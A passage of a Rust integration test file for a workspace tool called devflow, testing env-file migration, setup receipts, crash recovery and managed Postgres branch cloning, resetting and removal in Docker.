    assert_eq!(runs(&w), 1, "no hook ran again");
    let receipt = receipt_of(&w);
    assert!(receipt.services.is_empty(), "still no database");
    assert!(receipt.phase(Phase::Services).deliberate);
    assert!(!receipt.env_generation_is_legacy(&project.config));
    let item = listed(&project, "w");
    assert_eq!(item.status, Some(Status::Ready));
    assert_eq!(item.env_file, None);

    // Migrated, it notices the next change itself: a service that exports
    // another variable reopens the environment, as for any new workspace.
    let project = edit_config(&t, |text| {
        text + "\n[services.cache]\nengine = \"valkey\"\nenv = \"CACHE_URL\"\n"
    });
    assert_eq!(listed(&project, "w").status, Some(Status::NeedsAttention));
    setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(declared_names(&w).contains("CACHE_URL"));
}

#[test]
fn a_workspace_entered_after_an_upgrade_is_migrated_too() {
    // The same state, met by `activate` (the switch and the app's actions),
    // which repairs before anything else.
    let t = repo(&Hooks::default(), "");
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    let mut receipt = receipt_of(&w);
    receipt.env_generation = Some(legacy_no_db_generation(&t.project.config));
    receipt.save(&w.git_dir).unwrap();
    let project = edit_config(&t, |text| text + SERVICE);
    let out = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.repaired, [Repair::EnvFile]);
    assert!(declared_names(&w).contains("DATABASE_URL"));
    assert!(!receipt_of(&w).env_generation_is_legacy(&project.config));
}

/// A workspace set up with the recipe `APP_DB` that an "upgrade" meets: the
/// receipt keeps no history of the names it exported and the file is the one an
/// earlier devflow wrote, without the list of owned names. The recipe is
/// removed before this devflow sets the workspace up for the first time.
fn upgraded_workspace() -> (Repo, Project, Workspace) {
    let t = repo(&Hooks::default(), "[env]\nAPP_DB = \"${DATABASE_URL}\"\n");
    trust::approve(&t.project).unwrap();
    let url = "postgres://app:pw@db.internal:6543/app"; // kingfisher:ignore
    let out = create(
        &t.project,
        "w",
        SetupOptions {
            database_url: Some(url.into()),
            ..trusted(&t.project)
        },
    )
    .unwrap();
    let w = out.workspace;
    assert!(env_map(&w).contains_key("APP_DB"));
    let mut receipt = Receipt::load(&w.git_dir).unwrap().unwrap();
    receipt.exported.clear();
    receipt.save(&w.git_dir).unwrap();
    let vars = env_file::read(&w.path).unwrap();
    env_file::write(&w.path, &vars).unwrap();
    assert!(env_file::lacks_manifest(&w.path));
    let project = edit_config(&t, |text| {
        text.replace("[env]\nAPP_DB = \"${DATABASE_URL}\"\n", "")
    });
    (t, project, w)
}

#[test]
fn an_upgrade_keeps_the_names_of_the_file_it_replaces() {
    let (_t, project, w) = upgraded_workspace();
    let again = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(again.status, Status::Ready, "{:?}", again.receipt.phases);
    // The new file no longer sets `APP_DB`, and still says it was this
    // workspace's: the history was taken from the old file before it went.
    let contents = env_file::read_contents(&w.path).unwrap();
    assert!(!contents.vars.iter().any(|(name, _)| name == "APP_DB"));
    assert!(contents.former.contains("APP_DB"), "{:?}", contents.former);
    assert!(
        Receipt::load(&w.git_dir)
            .unwrap()
            .unwrap()
            .exported
            .contains("APP_DB")
    );
    // A shell that still holds it is cleared of it by `devflow exec`.
    let prepared = devflow_core::exec::prepare_root(&w.path).unwrap();
    let mut command = std::process::Command::new("sh");
    command
        .args(["-c", "printf %s \"${APP_DB-unset}\""])
        .env("APP_DB", "postgres://from-the-shell/db");
    prepared.apply(&mut command);
    assert_eq!(
        String::from_utf8(command.output().unwrap().stdout).unwrap(),
        "unset"
    );
}

#[cfg(unix)]
#[test]
fn a_replacement_that_cannot_be_published_leaves_the_old_file_and_its_names_in_the_receipt() {
    use std::os::unix::fs::PermissionsExt;
    // Where the permission bits do not bind, the write below cannot be made to
    // fail.
    // SAFETY: `geteuid` has no preconditions.
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let (_t, project, w) = upgraded_workspace();
    let dir = w.path.join(".devflow");
    let old = std::fs::read(env_file::path(&w.path)).unwrap();
    // The old file can be read, no file can be written beside it: the
    // replacement is never published.
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o555)).unwrap();
    let failed = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    );
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
    assert!(failed.is_err(), "the file could not be replaced");
    assert_eq!(std::fs::read(env_file::path(&w.path)).unwrap(), old);
    // The only record of the removed recipe was that file; the receipt has it
    // now.
    assert!(
        Receipt::load(&w.git_dir)
            .unwrap()
            .unwrap()
            .exported
            .contains("APP_DB")
    );
}

#[test]
fn setup_rebuilds_a_file_without_the_manifest_from_the_receipt_and_runs_no_hook() {
    // What the repair does for a ready workspace whose file an earlier
    // devflow wrote (`env_file::lacks_manifest` is the one predicate): nothing
    // else reopens the env phase, since the configuration is unchanged, and
    // `devflow exec` refuses the file until it is written again.
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "[env]\nAPP_DB = \"${DATABASE_URL}\"\n",
    );
    trust::approve(&t.project).unwrap();
    let url = "postgres://app:pw@db.internal:6543/app"; // kingfisher:ignore
    let out = create(
        &t.project,
        "w",
        SetupOptions {
            database_url: Some(url.into()),
            ..trusted(&t.project)
        },
    )
    .unwrap();
    let w = out.workspace;
    let runs = |w: &Workspace| {
        std::fs::read_to_string(w.path.join(".devflow/runs"))
            .unwrap()
            .lines()
            .count()
    };
    assert_eq!(runs(&w), 1);
    // The file an earlier devflow wrote, and a receipt with no history.
    let mut receipt = Receipt::load(&w.git_dir).unwrap().unwrap();
    receipt.exported.clear();
    receipt.save(&w.git_dir).unwrap();
    let vars = env_file::read(&w.path).unwrap();
    env_file::write(&w.path, &vars).unwrap();
    assert!(env_file::lacks_manifest(&w.path));
    let refused = devflow_core::exec::prepare_root(&w.path).unwrap_err();
    assert_eq!(
        devflow_core::remedy::remedies_of(&refused),
        [devflow_core::remedy::Remedy::Setup {
            workspace: w.path.clone()
        }]
    );
    assert_eq!(listed(&t.project, "w").status, Some(Status::Ready));

    // The remedy works: setup writes the file again from the receipt and the
    // approved recipes, keeps the names the old file had, and runs no hook.
    let again = setup::setup(
        &t.project,
        &w,
        trusted(&t.project),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(again.status, Status::Ready);
    assert!(!env_file::lacks_manifest(&w.path));
    assert!(devflow_core::exec::prepare_root(&w.path).is_ok());
    assert_eq!(runs(&w), 1, "no hook ran again");
    assert_eq!(env_map(&w)["APP_DB"], url);
    assert!(
        Receipt::load(&w.git_dir)
            .unwrap()
            .unwrap()
            .exported
            .contains("APP_DB"),
        "the names of the old file are the history"
    );
}

// ---------------------------------------------------------------------------
// Tests below need external programs. Run with `-- --ignored`.

/// Removes a project's managed compose project (containers and volume) and
/// stops the isolated pitchfork supervisor, even when the test panics.
struct Cleanup(Box<dyn FnMut()>);

impl Drop for Cleanup {
    fn drop(&mut self) {
        (self.0)();
    }
}

fn docker_compose(args: &[&str]) -> String {
    let out = std::process::Command::new("docker")
        .arg("compose")
        .args(args)
        .output()
        .expect("docker is available");
    String::from_utf8_lossy(&out.stdout).into_owned()
}

/// The compose project(s) a test's managed server created, removed at the end.
fn managed_cleanup(project: &Project) -> Cleanup {
    let project = project.clone();
    Cleanup(Box::new(move || {
        let file = devflow_core::paths::data_dir()
            .unwrap()
            .join("postgres")
            .join(project.id().to_string())
            .join("compose.yaml");
        let needle = file.display().to_string();
        let listing = docker_compose(&["ls", "-a", "--format", "json"]);
        let projects: Vec<serde_json::Value> = serde_json::from_str(&listing).unwrap_or_default();
        for p in projects {
            if p["ConfigFiles"]
                .as_str()
                .is_some_and(|f| f.contains(&needle))
                && let Some(name) = p["Name"].as_str()
            {
                docker_compose(&["-p", name, "down", "-v", "--remove-orphans"]);
            }
        }
    }))
}

const MANAGED: &str =
    "[services.db]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\n";

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn a_removal_drops_the_branch_recorded_before_its_creation_and_only_this_instances() {
    use devflow_core::db::ResolvedSource;
    use devflow_core::receipt::PendingBranch;
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    // A workspace set up without data (so the server is not asked), whose
    // receipt then says what a crash would have left: a branch begun for
    // `db`, created on the server, credentials never recorded.
    let crash = |name: &str,
                 instance_of_branch: Option<uuid::Uuid>,
                 service: &str,
                 engine: Option<devflow_core::config::Engine>| {
        let w = create(
            &t.project,
            name,
            SetupOptions {
                data_from: Some(DataSource::Empty),
                no_db: true,
                ..Default::default()
            },
        )
        .unwrap()
        .workspace;
        let mut receipt = receipt_of(&w);
        let server = devflow_core::db::Server::for_project(&t.project)
            .unwrap()
            .unwrap();
        server.up().unwrap();
        let id = uuid::Uuid::new_v4();
        server
            .create_branch_with_id(
                id,
                name,
                ResolvedSource::Empty,
                instance_of_branch.or(Some(receipt.instance_id)),
            )
            .unwrap();
        receipt.creating = Some(PendingBranch {
            service: service.into(),
            branch_id: id,
            engine,
            file: None,
        });
        receipt.save(&w.git_dir).unwrap();
        (w, server, id)
    };

    // Created for this instance: dropped, with the worktree.
    let (w, server, id) = crash(
        "crashed",
        None,
        "db",
        Some(devflow_core::config::Engine::Postgres),
    );
    assert!(server.branch(id).unwrap().is_some());
    let out = setup::remove(
        &t.project,
        "crashed",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, Some(id), "{out:?}");
    assert!(server.branch(id).unwrap().is_none(), "no branch leaked");
    assert!(!w.path.exists());

    // Created for another instance: not this workspace's to drop.
    let (w, server, id) = crash(
        "borrowed",
        Some(uuid::Uuid::new_v4()),
        "db",
        Some(devflow_core::config::Engine::Postgres),
    );
    let out = setup::remove(
        &t.project,
        "borrowed",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, None);
    assert!(
        out.warnings
            .iter()
            .any(|m| m.contains("created by another instance")),
        "{:?}",
        out.warnings
    );
    assert!(server.branch(id).unwrap().is_some(), "left alone");
    assert!(!w.path.exists());

    // Recorded but never created (the crash came before): nothing to drop,
    // nothing to say.
    let (w, server, _) = crash(
        "early",
        None,
        "db",
        Some(devflow_core::config::Engine::Postgres),
    );
    let never = uuid::Uuid::new_v4();
    let mut receipt = receipt_of(&w);
    receipt.creating = Some(PendingBranch {
        service: "db".into(),
        branch_id: never,
        engine: Some(devflow_core::config::Engine::Postgres),
        file: None,
    });
    receipt.save(&w.git_dir).unwrap();
    let out = setup::remove(
        &t.project,
        "early",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, None);
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
    assert!(server.branch(never).unwrap().is_none());

    // Recorded for a service the configuration does not have (it was renamed
    // or removed since the crash): the project's one server is asked for the
    // id, and the branch is still dropped.
    let (w, server, id) = crash(
        "renamed",
        None,
        "ghost",
        Some(devflow_core::config::Engine::Postgres),
    );
    let out = setup::remove(
        &t.project,
        "renamed",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, Some(id), "{out:?}");
    assert!(server.branch(id).unwrap().is_none(), "no branch leaked");
    assert!(!w.path.exists());

    // A record from before the engine was written with it is looked for in
    // every backend: the server has it.
    let (w, server, id) = crash("older", None, "ghost", None);
    let out = setup::remove(
        &t.project,
        "older",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, Some(id), "{out:?}");
    assert!(server.branch(id).unwrap().is_none(), "no branch leaked");
    assert!(!w.path.exists());
    server.down().unwrap();
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn renaming_a_service_never_reuses_its_orphaned_branch_and_recovery_is_by_recorded_identity() {
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls);
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(w.status, Status::Ready, "{:?}", w.receipt.phases);
    let old = binding(&w.receipt);
    connect(&old.url).unwrap(); // the original credentials work

    // `services.db` becomes `services.main`.
    let project = edit_config(&t, |text| text.replace("[services.db]", "[services.main]"));
    assert_eq!(project.config.postgres().unwrap().0, "main");
    let renamed = setup::setup(
        &project,
        &w.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        renamed.status,
        Status::Ready,
        "{:?}",
        renamed.receipt.phases
    );
    let receipt = receipt_of(&w.workspace);
    let new = &receipt.services["main"];
    let orphan = &receipt.services["db"];
    assert_ne!(
        new.branch_id, old.branch_id,
        "the renamed service got a branch of its own"
    );
    assert_ne!(new.database, old.database);
    assert_eq!(orphan.branch_id, old.branch_id);
    assert_eq!(
        orphan.url, old.url,
        "the orphan's credentials are untouched"
    );
    assert!(orphan.orphaned);
    connect(&old.url).unwrap();
    connect(&new.url).unwrap();
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], new.url);

    // A creation interrupted after the server created the branch but before
    // the credentials were recorded: the receipt names the branch it asked
    // for, and the next setup takes exactly that one over.
    let server = devflow_core::db::Server::for_project(&project)
        .unwrap()
        .unwrap();
    let a = create(
        &project,
        "a",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    let a_ws = a.workspace.clone();
    let mut crashed = receipt_of(&a_ws);
    let kept = crashed.services.remove("main").unwrap();
    let lost = uuid::Uuid::new_v4();
    let creds = server
        .create_branch_with_id(
            lost,
            "a",
            devflow_core::db::ResolvedSource::Empty,
            Some(crashed.instance_id),
        )
        .unwrap();
    crashed.creating = Some(devflow_core::receipt::PendingBranch {
        service: "main".into(),
        branch_id: lost,
        engine: Some(devflow_core::config::Engine::Postgres),
        file: None,
    });
    crashed.set_phase(Phase::Services, PhaseState::Started, None);
    crashed.save(&a_ws.git_dir).unwrap();
    let recovered = setup::setup(
        &project,
        &a_ws,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        recovered.status,
        Status::Ready,
        "{:?}",
        recovered.receipt.phases
    );
    let took = &recovered.receipt.services["main"];
    assert_eq!(
        took.branch_id,
        Some(lost),
        "the recorded branch, not a new one"
    );
    assert_ne!(took.url, creds.url, "its password was rotated");
    assert_ne!(took.branch_id, kept.branch_id);
    assert!(recovered.receipt.creating.is_none());
    connect(&took.url).unwrap();

    // The same intent under another service key recovers nothing: the branch
    // it names is another service's. Nor is it overwritten: with one slot for
    // the intent, provisioning `main` over it would erase the only evidence
    // that the branch was made, so the phase is refused until it is settled.
    let mut other = receipt_of(&a_ws);
    other.services.remove("main");
    other.creating = Some(devflow_core::receipt::PendingBranch {
        service: "db".into(),
        branch_id: lost,
        engine: Some(devflow_core::config::Engine::Postgres),
        file: None,
    });
    other.set_phase(Phase::Services, PhaseState::Started, None);
    other.save(&a_ws.git_dir).unwrap();
    let error = setup::setup(
        &project,
        &a_ws,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    let said = format!("{error:#}");
    assert!(
        said.contains(&lost.to_string()) && said.contains("no longer configured"),
        "{said}"
    );
    let kept = receipt_of(&a_ws);
    assert!(
        !kept.services.contains_key("main"),
        "`main` is not provisioned over it"
    );
    assert_eq!(kept.creating.map(|p| p.branch_id), Some(lost));
    // A removal still accounts for it: the instance created it, so it is dropped.
    let removed = setup::remove(&project, "a", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(removed.dropped_branch, Some(lost), "{removed:?}");
    assert!(server.branch(lost).unwrap().is_none(), "no branch leaked");
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn a_changed_endpoint_setting_reaches_the_workspace_url_before_the_service_is_stamped() {
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(w.status, Status::Ready, "{:?}", w.receipt.phases);
    let first = binding(&w.receipt);
    let real_port = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap()
        .app_endpoint()
        .unwrap()
        .1;
    assert!(
        first.url.contains(&format!(":{real_port}/")),
        "{}",
        first.url
    );

    // `app_port` is what workspace URLs advertise (a proxy in front, say).
    // The service section changed, so setup reuses the branch; the URL must
    // follow before the new generation is recorded.
    let project = edit_config(&t, |text| {
        text.replace(MANAGED, &format!("{MANAGED}app_port = 15432\n"))
    });
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let out = setup::setup(
        &project,
        &w.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let moved = receipt_of(&w.workspace).services["db"].clone();
    assert_eq!(moved.branch_id, first.branch_id, "the same branch");
    assert_eq!(
        moved.url,
        first.url.replace(&format!(":{real_port}/"), ":15432/"),
        "only the endpoint changed; user, password and database are kept"
    );
    assert_eq!(moved.applied, project.config.service_generation("db"));
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], moved.url);
    assert_eq!(env_map(&w.workspace)["PGPORT"], "15432");

    // Back to the server's own endpoint.
    let project = edit_config(&t, |text| text.replace("app_port = 15432\n", ""));
    setup::setup(
        &project,
        &w.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(receipt_of(&w.workspace).services["db"].url, first.url);
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], first.url);
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_non_interactive_runs_seed_from_the_configured_snapshot() {
    let t = repo(
        &Hooks::default(),
        &format!("{MANAGED}\n[data]\nnoninteractive_from = \"snapshot:seed\"\n"),
    );
    let _cleanup = managed_cleanup(&t.project);
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls).unwrap();
    let rows = |url: &str| -> i64 {
        connect(url)
            .query_one("SELECT count(*) FROM t", &[])
            .unwrap()
            .get(0)
    };
    let non_interactive = SetupOptions {
        non_interactive: true,
        ..Default::default()
    };

    // The data worth seeding from, snapshotted by name.
    let a = create(
        &t.project,
        "a",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    let binding_a = binding(&a.receipt);
    connect(&binding_a.url)
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t VALUES (1), (2), (3)")
        .unwrap();
    devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap()
        .create_snapshot("seed", binding_a.branch_id.unwrap())
        .unwrap();

    // A non-interactive run without --data-from takes the snapshot.
    let b = create(&t.project, "b", non_interactive.clone()).unwrap();
    assert_eq!(b.status, Status::Ready, "{:?}", b.receipt.phases);
    assert_eq!(binding(&b.receipt).source, "snapshot:seed@v1");
    assert_eq!(rows(&binding(&b.receipt).url), 3);
    assert!(b.warnings.is_empty(), "{:?}", b.warnings);

    // --data-from wins.
    let c = create(
        &t.project,
        "c",
        SetupOptions {
            data_from: Some(DataSource::Workspace { name: "a".into() }),
            ..non_interactive.clone()
        },
    )
    .unwrap();
    assert_eq!(binding(&c.receipt).source, "workspace:a");

    // A snapshot that does not exist never falls back to a live workspace:
    // the service fails with remedies, and the default workspace's shared
    // root branch is not created on the side.
    let missing = edit_config(&t, |text| text.replace("snapshot:seed", "snapshot:nope"));
    let error = create(&missing, "e", non_interactive.clone()).unwrap_err();
    let kinds: Vec<_> = devflow_core::remedy::remedies_of(&error)
        .iter()
        .map(|r| r.kind())
        .collect();
    assert!(
        kinds.contains(&"create_seed_snapshot") && kinds.contains(&"choose_data_source"),
        "{kinds:?}: {error:#}"
    );
    assert!(format!("{error:#}").contains("'nope'"), "{error:#}");
    assert!(
        receipt_of(&ws(&missing, "e")).services.is_empty(),
        "nothing was cloned for it"
    );
    assert!(
        Receipt::load(&ws(&missing, "main").git_dir)
            .unwrap()
            .is_none_or(|receipt| receipt.services.is_empty()),
        "the root branch of the default workspace was not created"
    );

    // The opt-in fallback starts the service empty, with a warning.
    let empty = edit_config(&t, |text| {
        text.replace(
            "snapshot:nope\"\n",
            "snapshot:nope\"\nnoninteractive_fallback = \"empty\"\n",
        )
    });
    let f = create(&empty, "f", non_interactive.clone()).unwrap();
    assert_eq!(f.status, Status::Ready, "{:?}", f.receipt.phases);
    assert_eq!(binding(&f.receipt).source, "empty");
    assert!(
        f.warnings
            .iter()
            .any(|w| w.contains("'nope'") && w.contains("noninteractive_fallback")),
        "{:?}",
        f.warnings
    );

    // An interactive run does not seed: it clones the default workspace, whose
    // root branch is created empty whoever asks first.
    let d = create(&empty, "d", SetupOptions::default()).unwrap();
    assert_eq!(binding(&d.receipt).source, "workspace:main");
    let root = receipt_of(&ws(&empty, "main"));
    assert_eq!(binding(&root).source, "empty");
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_create_clone_reset_and_remove() {
    let t = repo(
        &Hooks {
            setup: &["echo \"$DATABASE_URL\" > .devflow/db-url"],
            ..Default::default()
        },
        "[services.db]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\ndatabase = \"shop\"\n",
    );
    trust::approve(&t.project).unwrap();
    let project = t.project.clone();
    let _cleanup = Cleanup(Box::new(move || {
        let file = devflow_core::paths::data_dir()
            .unwrap()
            .join("postgres")
            .join(project.id().to_string())
            .join("compose.yaml");
        let needle = file.display().to_string();
        let listing = docker_compose(&["ls", "-a", "--format", "json"]);
        let projects: Vec<serde_json::Value> = serde_json::from_str(&listing).unwrap_or_default();
        for p in projects {
            if p["ConfigFiles"]
                .as_str()
                .is_some_and(|f| f.contains(&needle))
                && let Some(name) = p["Name"].as_str()
            {
                docker_compose(&["-p", name, "down", "-v", "--remove-orphans"]);
            }
        }
    }));
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls);
    let count = |url: &str| -> i64 {
        connect(url)
            .unwrap()
            .query_one("SELECT count(*) FROM t", &[])
            .unwrap()
            .get(0)
    };

    // a: the first workspace gets an empty branch cloned from the implicit root branch.
    let a = create(&t.project, "feature/a", SetupOptions::default()).unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    let binding_a = binding(&a.receipt);
    assert!(binding_a.owned && binding_a.branch_id.is_some());
    assert_eq!(binding_a.source, "workspace:main");
    let root = receipt_of(&ws(&t.project, "main"));
    assert!(
        binding(&root).branch_id.is_some(),
        "the default workspace got a root branch"
    );
    assert_eq!(
        a.receipt.data_source_id,
        Some(format!("branch:{}", binding(&root).branch_id.unwrap())),
        "the resolved source is recorded next to the user-facing one"
    );
    assert_eq!(env_map(&a.workspace)["DATABASE_URL"], binding_a.url);
    assert_eq!(
        std::fs::read_to_string(a.workspace.path.join(".devflow/db-url"))
            .unwrap()
            .trim(),
        binding_a.url
    );
    connect(&binding_a.url)
        .unwrap()
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t VALUES (1)")
        .unwrap();

    // b clones a's data and is isolated from it.
    let b = create(
        &t.project,
        "feature/b",
        SetupOptions {
            data_from: Some(DataSource::Workspace {
                name: "feature/a".into(),
            }),
            ..Default::default()
        },
    )
    .unwrap();
    let binding_b = binding(&b.receipt);
    assert_eq!(binding_b.source, "workspace:feature/a");
    assert_eq!(
        b.receipt.data_source_id,
        Some(format!("branch:{}", binding_a.branch_id.unwrap()))
    );
    assert_eq!(count(&binding_b.url), 1);
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (2)")
        .unwrap();
    assert_eq!(count(&binding_a.url), 1, "a does not see b's write");

    // Sessions the clone had to end on its source reach the outcome's
    // warnings (and so the command line and the app).
    let mut open_session = connect(&binding_a.url).unwrap();
    open_session.batch_execute("SELECT 1").unwrap();
    let c = create(
        &t.project,
        "feature/c",
        SetupOptions {
            data_from: Some(DataSource::Workspace {
                name: "feature/a".into(),
            }),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(
        c.warnings
            .iter()
            .any(|w| w.contains("session(s) on the source database")),
        "{:?}",
        c.warnings
    );
    drop(open_session);
    setup::remove(
        &t.project,
        "feature/c",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();

    // snapshot a, then reset b to it and back to its recorded source.
    let snap = setup::snapshot(&t.project, &a.workspace, "seed").unwrap();
    assert_eq!(snap.version, 1);
    setup::reset_data(
        &t.project,
        &b.workspace,
        Some(DataSource::Snapshot {
            name: "seed".into(),
            version: None,
        }),
    )
    .unwrap();
    assert_eq!(count(&binding_b.url), 1, "same URL after reset");
    connect(&binding_a.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (3)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "reset to the recorded source clones a's current data"
    );

    // The default reset follows b's immutable provenance (a's branch), never
    // the name `feature/a`: remove a keeping its data, reset b (the name no
    // longer resolves to anything), then give the name to a workspace with
    // other data and reset b again.
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();
    let kept = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(kept.dropped_branch, None);
    assert!(
        server
            .branch(binding_a.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (99)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "reset clones the kept branch of the removed workspace"
    );
    let a2 = create(
        &t.project,
        "feature/a",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    let binding_a2 = binding(&a2.receipt);
    assert_ne!(binding_a2.branch_id, binding_a.branch_id);
    connect(&binding_a2.url)
        .unwrap()
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t SELECT generate_series(1, 7)")
        .unwrap();
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (99)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "the new feature/a (7 rows) is not b's source"
    );

    // A retry after a crash clones exactly the source the first attempt
    // pinned, even though `feature/a` now names another branch.
    let retry = worktree::create(&t.project, "retry", None).unwrap();
    let mut pinned = Receipt::new(t.project.id(), "retry", Some("main".into()));
    pinned.set_phase(Phase::Materialize, PhaseState::Done, None);
    pinned.data_source = Some("workspace:feature/a".into());
    pinned.data_source_id = Some(format!("branch:{}", binding_a.branch_id.unwrap()));
    pinned.save(&retry.git_dir).unwrap();
    let out = setup::setup(
        &t.project,
        &retry,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let binding_retry = binding(&out.receipt);
    assert_eq!(binding_retry.source, "workspace:feature/a");
    assert_eq!(
        count(&binding_retry.url),
        2,
        "the pinned branch, not the 7-row one"
    );

    // Removing b drops its branch; the kept branch of the old a and the root stay.
    let out = setup::remove(
        &t.project,
        "feature/b",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, binding_b.branch_id);
    assert!(
        server
            .branch(binding_b.branch_id.unwrap())
            .unwrap()
            .is_none()
    );
    assert!(
        server
            .branch(binding_a.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    assert!(connect(&binding_b.url).is_err());

    // --keep-data leaves the branch behind.
    let out = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, None);
    assert!(
        server
            .branch(binding_a2.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    server.down().unwrap();
}

/// `extra_databases` through the whole pipeline on a managed server: the URLs
/// reach `.devflow/env` and the hooks (masked in their output), the receipt
/// lists names and databases without a second copy of the password, a clone
/// and a reset leave them empty, a name added later is provisioned by the next
/// setup and a name removed leaves an orphan on the server, and removing the
/// workspace drops them (or keeps them with the data).
#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_scratch_databases_reach_the_environment_and_follow_the_workspace() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"hook sees $TEST_DATABASE_URL\"",
                "echo \"$SHADOW_DATABASE_URL\" > .devflow/shadow-url",
            ],
            ..Default::default()
        },
        &format!("{MANAGED}extra_databases = [\"test\", \"shadow\"]\n"),
    );
    trust::approve(&t.project).unwrap();
    let _cleanup = managed_cleanup(&t.project);
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls).unwrap();
    let tables = |url: &str| -> i64 {
        connect(url)
            .query_one(
                "SELECT count(*) FROM pg_tables WHERE schemaname = 'public'",
                &[],
            )
            .unwrap()
            .get(0)
